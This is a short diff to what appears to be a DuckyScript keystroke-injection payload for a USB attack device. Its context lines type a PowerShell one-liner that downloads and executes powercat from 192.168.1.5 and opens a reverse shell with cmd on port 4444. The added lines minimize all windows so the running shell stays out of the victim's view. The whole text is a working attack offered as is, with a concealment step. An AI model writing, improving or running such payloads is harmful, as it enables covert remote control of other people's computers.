@@ -32,3 +32,5 @@ Enter
 STRING IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/powercat.ps1');powercat -c 192.168.1.5 -p 4444 -e cmd
 REM Powershell one-liner to download and execute Powercat for reverse shell 
 ENTER
+GUI DOWN DOWN
+REM Windows is now minimized with reverse shell still running
